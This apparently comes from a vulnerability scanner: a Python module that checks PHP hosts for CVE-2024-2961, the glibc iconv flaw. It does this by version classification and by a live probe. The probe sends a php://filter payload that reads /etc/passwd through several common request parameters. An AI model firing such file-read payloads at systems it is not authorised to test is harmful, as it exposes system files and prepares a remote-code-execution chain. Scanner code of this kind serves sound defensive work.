from __future__ import annotations

import base64
import re
from typing import Any

from ...core.http import HttpClient, normalize_url
from ...core.models import Confidence, Finding, Status
from ...core.versions import parse_version_required, parse_version_safe

CVE_ID = "CVE-2024-2961"
NAME = "glibc iconv buffer overflow to PHP RCE"
RULE = "PHP 5.6.0-8.3.6 on glibc 2.39 or older, reachable through a user-controlled iconv/php://filter charset"
FIXED_RULE = "Upgrade PHP to 8.3.7+ and glibc to 2.40+ (or disable ISO-2022-CN-EXT); remove arbitrary file-read primitives"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe"]
_PARAMS = ("file", "path", "page", "template", "view", "include")
_B64_ROOT = re.compile(r"cm9vdDp4|cm9vd[A-Za-z0-9+/]{4,}")


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return Status.DETECTED_VERSION_UNKNOWN
    if parse_version_required("5.6.0") <= parsed < parse_version_required("8.3.7"):
        return Status.LIKELY_VULNERABLE
    return Status.PATCHED


def _find_file_read(client: HttpClient, base: str, timeout: int) -> dict[str, Any]:
    payload = "php://filter/convert.base64-encode/resource=/etc/passwd"
    attempts = []
    for param in _PARAMS:
        response = client.request(
            f"{base}/",
            method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=f"{param}={payload}".encode(),
            timeout=timeout,
            follow_redirects=True,
        )
        body = str(response.get("body") or "")
        match = _B64_ROOT.search(body)
        decoded = ""
        if match:
            raw = re.sub(r"[^A-Za-z0-9+/=]", "", match.group(0))
            try:
                decoded = base64.b64decode(raw + "=" * (-len(raw) % 4)).decode("utf-8", "replace")
            except ValueError:
                decoded = ""
        attempts.append(
            {
                "param": param,
                "status": response.get("status"),
                "file_read": bool(match),
                "decoded_prefix": decoded[:40],
            }
        )
        if match:
            return {"file_read": True, "param": param, "attempts": attempts}
    return {"file_read": False, "param": None, "attempts": attempts}


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    php_runtime: dict[str, Any] | None = None,
    **kwargs: Any,
):
    del cms_version, kwargs
    runtime = php_runtime or {}
    version = runtime.get("version")
    status = classify_version(version)
    if not runtime.get("detected"):
        return Finding(
            cve=CVE_ID, name=NAME, status=Status.NOT_DETECTED, confidence=Confidence.LOW,
            component="PHP runtime / glibc iconv", affected_rule=RULE,
            exploit_available=HAS_EXPLOIT,
            detail="PHP was not fingerprinted from public HTTP responses.",
            action="Verify the PHP and glibc versions on the host.",
            vulnerability_type="Remote Code Execution",
        )
    if status == Status.PATCHED:
        return Finding(
            cve=CVE_ID, name=NAME, status=Status.PATCHED, confidence=Confidence.HIGH,
            component="PHP runtime / glibc iconv", component_version=version,
            affected_rule=RULE, exploit_available=HAS_EXPLOIT,
            detail=f"PHP {version} is at or beyond the fixed 8.3.7 release; confirm glibc is 2.40+.",
            action=FIXED_RULE, vulnerability_type="Remote Code Execution",
        )
    if not run_exploit_check:
        return Finding(
            cve=CVE_ID, name=NAME, status=status, confidence=Confidence.HIGH,
            component="PHP runtime / glibc iconv", component_version=version,
            affected_rule=RULE, exploit_available=HAS_EXPLOIT,
            detail=(
                f"PHP {version} is in the affected range; the iconv overflow requires a "
                "user-controlled charset and a file-read/filter primitive."
            ),
            action=FIXED_RULE, vulnerability_type="Remote Code Execution",
        )
    if exploit_mode != "safe":
        return Finding(
            cve=CVE_ID, name=NAME, status=status, confidence=Confidence.MEDIUM,
            component="PHP runtime / glibc iconv", component_version=version,
            affected_rule=RULE, exploit_available=HAS_EXPLOIT,
            detail="This module supports only the safe file-read precondition probe.",
            action=FIXED_RULE, vulnerability_type="Remote Code Execution",
        )

    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    probe = _find_file_read(client, base, timeout)
    if probe["file_read"]:
        return Finding(
            cve=CVE_ID, name=NAME, status=Status.VULNERABLE, confidence=Confidence.CONFIRMED,
            component="PHP runtime / glibc iconv", component_version=version,
            affected_rule=RULE, exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}/", evidence=probe,
            detail=(
                f"PHP {version} is in the affected range and the `{probe['param']}` parameter "
                "performed a php://filter base64 read of /etc/passwd. That file-read primitive "
                "is the first stage of the CVE-2024-2961 iconv chain; the full RCE chain was not run."
            ),
            action=FIXED_RULE, vulnerability_type="Remote Code Execution",
        )
    return Finding(
        cve=CVE_ID, name=NAME, status=Status.NOT_CONFIRMED, confidence=Confidence.MEDIUM,
        component="PHP runtime / glibc iconv", component_version=version,
        affected_rule=RULE, exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}/", evidence=probe,
        detail="The version is affected, but no common file-read parameter returned the /etc/passwd base64 marker.",
        action=FIXED_RULE, vulnerability_type="Remote Code Execution",
    )


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "php",
        "name": NAME,
        "component": "PHP runtime / glibc iconv",
        "affected_rule": RULE,
        "affected_versions": ["PHP >=5.6.0,<8.3.7 with glibc <=2.39"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "vulnerability_type": "Remote Code Execution",
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-13",
        "updated": "2026-11-13",
        "required_detectors": ["php"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2024-2961",
            "https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html",
            "https://github.com/ambionics/cnext-exploits",
        ],
    }
